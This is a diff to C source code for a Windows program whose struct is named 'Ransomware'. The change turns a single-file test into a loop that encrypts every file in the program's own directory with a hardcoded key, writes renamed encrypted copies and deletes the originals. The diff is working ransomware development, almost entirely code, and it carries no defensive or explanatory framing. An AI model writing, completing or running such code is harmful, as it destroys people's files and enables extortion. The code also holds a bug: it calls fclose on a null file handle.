@@ -1,6 +1,8 @@
 #include <stdio.h>
 #include <string.h>
 #include <windows.h>
+#include <dirent.h>
+#include <stdbool.h>
 
 typedef struct Ransomware
 {
@@ -13,18 +15,30 @@ int			_GetFileSize			(FILE *file);
 char	*	_CreateNewFileName		(char *fileName);
 int			_EncriptFile			(_FILE_ currentFile, char *key);
 _FILE_		_LoadCurrentFile		(char *fileName);
+char	*	_GetCurrentPath			();
+bool		_ValidateFile			(char *fileName);
 
 int main()
 {
-
+	
 	char key[] = {"Vª╣Ù#A*~#═¸Ù#3¢kéî¤F¾°sú▀wtèklsy±?Çd¤■7┴iß'üÆÍE©æ¬Ë╚░╝Øz?fFò"};
+	
+	DIR *dir;
+	struct dirent *lsdir;
+	_FILE_ currentFile;
 
-	char fileName[] = {"teste.txt"};
+	dir = opendir(_GetCurrentPath());
 
-	_FILE_ currentFile = _LoadCurrentFile(fileName);
-
-	_EncriptFile(currentFile, key);
-
+	while((lsdir=readdir(dir)) != NULL)
+	{
+		if (_ValidateFile(lsdir->d_name))
+		{
+			puts(lsdir->d_name);
+			currentFile = _LoadCurrentFile(lsdir->d_name);
+			_EncriptFile(currentFile, key);
+		}
+	}
+	
 	return 0;
 }
 
@@ -61,15 +75,47 @@ int _EncriptFile(_FILE_ fileToEncript, char *key)
 
 	free(fileToEncript.Data);
 	fclose(file);
-	
+
+	remove(fileToEncript.Name);
 	return 0;
+}
+
+bool _ValidateFile(char *fileName)
+{
+	FILE *file = fopen(fileName, "rb");
+	if (file == NULL){
+		fclose(file);
+		return false;
+	}else{
+		fclose(file);
+		return true;
+	}
 }
 
 char *_CreateNewFileName(char *fileName)
 {
 	static char tag[] = {"[hash]"};
-	strcat(tag, fileName);
-	return tag;
+
+	static char newFileName[MAX_PATH];
+	
+	strcpy(newFileName, tag);
+	strcat(newFileName, fileName);
+
+	return newFileName;
+}
+
+char *_GetCurrentPath()
+{
+	static char src[MAX_PATH];
+	GetModuleFileName(NULL, src, MAX_PATH);
+
+	int i = 0;
+
+	while(src[i] != '\0'){i++;}
+	while(src[i] != '\\'){i--;} i++;
+	src[i] = '\0';
+
+	return src;
 }
 
 int _GetFileSize(FILE *file)
